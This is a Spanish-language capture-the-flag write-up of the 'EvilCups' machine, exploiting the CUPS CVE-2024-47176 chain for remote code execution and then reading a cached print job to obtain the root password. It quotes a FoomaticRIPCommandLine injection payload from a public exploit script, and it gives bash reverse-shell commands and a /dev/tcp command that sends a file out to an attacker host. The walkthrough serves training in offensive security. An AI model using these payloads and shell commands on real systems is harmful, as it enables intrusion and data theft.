---
title: "EvilCups"
date: "2025-03-11T17:00:00-05:00"
type: "maquinas"
draft: false
tags: ["CVE-2024-47076", "CVE-2024-47175", "CVE-2024-47176", "CVE-2024-47177", "linux", "RCE", "UDP"]
---
### Descripción:
Maquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentación del servicio y leer un archivo descubriendo su nombre

# Enumeración

```bash
sudo nmap -p- --min-rate 5000 -Pn -n --open -sS [IP] -oG allPorts
nmap -p22,601 -sVC -A [IP] -oN target
```

<a href="https://imgur.com/3zIfURM"><img src="https://i.imgur.com/3zIfURM.png" title="source: imgur.com" /></a>

Si hacemos una rápida búsqueda de puerto 631 encontraremos que además de mencionar el puerto `TCP` también mencionan el puerto pero en [`UDP`](https://es.adminsub.net/tcp-udp-port-finder/631), debido a esto vamos a escanear también este protocolo.

```bash
nmap -sU -p631 [IP]
```

<a href="https://imgur.com/Nm3UrFv"><img src="https://i.imgur.com/Nm3UrFv.png" title="source: imgur.com" /></a>

## CUPS - TCP 631

<a href="https://imgur.com/KCk6bh6"><img src="https://i.imgur.com/KCk6bh6.png" title="source: imgur.com" /></a>

Cups tiene una GUI para ayudar al uso de su servicio.

<a href="https://imgur.com/u7JYm95"><img src="https://i.imgur.com/u7JYm95.png" title="source: imgur.com" /></a>

Podemos ver que hay una impresora instalada en el servicio.

# Usuario

## CUPS CVE’S

Buscando por la versión del servicio vamos a hallar diferentes vulnerabilidades que hay para este:

- CVE-2024-47176 - cups-browsed, el servicio que típicamente escucha en todas las interfaces UDP 631, es el que permite agregar una impresora a una máquina de forma remota. Esta vulnerabilidad permite que cualquier atacante que pueda alcanzar esta máquina active una solicitud "Get-Printer-Attributes" del Protocolo de Impresión por Internet (IPP) que se envía a una URL controlada por el atacante. Esto se corrigió simplemente deshabilitando cups-browsed ya que no es realmente la mejor manera de obtener esta funcionalidad.
- CVE-2024-47076 - libcupsfilters es responsable de manejar los atributos IPP devueltos de la solicitud. Estos se escriben en un archivo temporal de Descripción de Impresora Postscript (PPD) sin sanitización, permitiendo que se escriban atributos maliciosos.
- CVE-2024-47175 - libppd es responsable de leer un archivo PPD temporal y convertirlo en un objeto de impresora en el sistema. Tampoco realiza sanitización durante la lectura, permitiendo la inyección de datos controlados por el atacante.
- CVE-2024-47177 - Esta vulnerabilidad en cups-filters permite cargar una impresora usando el filtro de impresión foomatic-rip, que es un convertidor universal para transformar datos PostScript o PDF al formato que la impresora puede entender. Ha tenido problemas de inyección de comandos durante mucho tiempo y se ha limitado solo a instalaciones y configuraciones manuales.

Combinando estas cuatro vulnerabilidades podremos agregar una impresora y ejecutar comandos cuando imprimamos desde esta.

## Explotación

El creador de la maquina tiene una [script](https://github.com/IppSec/evil-cups/tree/main) que nos va a ayudar a resolver esta maquina.

La función `__main__` nos da una buena idea de que hace el script:

```python
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("%s <LOCAL_HOST> <TARGET_HOST> <COMMAND>" % sys.argv[0])
        quit()

    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12345

    command = sys.argv[3]

    server = IPPServer((SERVER_HOST, SERVER_PORT),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    TARGET_HOST = sys.argv[2]
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("Please wait this normally takes 30 seconds...")

    seconds = 0
    while True:
        print(f"\r{seconds} elapsed", end="", flush=True)
        time.sleep(1)
        seconds += 1
```

Al leer el script nos damos cuenta que lo que esta haciendo es montar un servidor `ipp` y mandarle un paquete, vamos a revisar en donde se vuelve malicioso el paquete que envía ya que todos los atributos son normales menos el ultimo donde hace una inyección pasándole [FoomaticRIPCommandLine](https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-p9rh-jxmq-gq47).

```python
class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()
    
    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (   
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
            ...[snip]...
            (
                SectionEnum.printer,
                b'printer-more-info',
                TagEnum.uri
            ): [f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()],
...[snip]...
```

### Agregar la impresora

Para esto vamos a ejecutar el script de la siguiente forma:

```bash
python evilcups.py 10.10.14.152 10.129.231.157 'bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"'
```

Y si vamos a la pagina http que tiene el servicio a la parte de impresoras tendremos una nueva impresora:

<a href="https://imgur.com/rpyZbhZ"><img src="https://i.imgur.com/rpyZbhZ.png" title="source: imgur.com" /></a>

Listo ahora es el momento de probar si ejecuta comandos:

```bash
# Nos ponemos en escucha
nc -lvnp 4444
```

En la pagina de la impresora en la sección de mantenimiento podemos imprimir una pagina de prueba con esto conseguiremos la shell y la flag.

Una mejor shell para enviar seria **`nohup bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"&`**, ya que inicia un proceso en segundo plano, para evitar que la shell se pierda cada 5 minutos aproximadamente cuando al impresora se elimina.

# Root

Primero hacemos el tratamiento de la `tty` como acostumbramos:

Aquí está el tratamiento típico de la TTY:

```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Listo después de listar por un rato no encontré nada interesante por lo que me devolví a la web y vi que la impresora que siempre esta presente tenia un trabajo que había realizado así que revisando la documentación nos dimos cuenta que estos trabajos se guardan en `/var/spool/cups/` y si bien no podemos listar dentro del directorio por medio de la documentación sabemos el nombre del archivo que es `d[5 números]-001` por lo tanto si ejecutamos el siguiente comando veremos el archivo:

```bash
cat d00001-001
```

Entonces vamos a mandarnos este archivo a nuestra maquina para enviar el archivo vamos a usar `/dev/tcp` podemos hacer:

```bash
# En nuestra maquina
nc -lvnp 4444 > archivo.pdf

# En la maquina victima
cat d00001-001 > /dev/tcp/TU_IP/4444
```

De esta forma el archivo se transferirá a nuestra máquina a través de una conexión TCP en el puerto 4444.

Y si abrimos este pdf en nuestra maquina tendremos la contraseña para root:

<a href="https://imgur.com/WW5jiOB"><img src="https://i.imgur.com/WW5jiOB.png" title="source: imgur.com" /></a>

Si quieres aprender mas sobre el CVE que se exploto tienes estas referencias:

- https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained
- https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
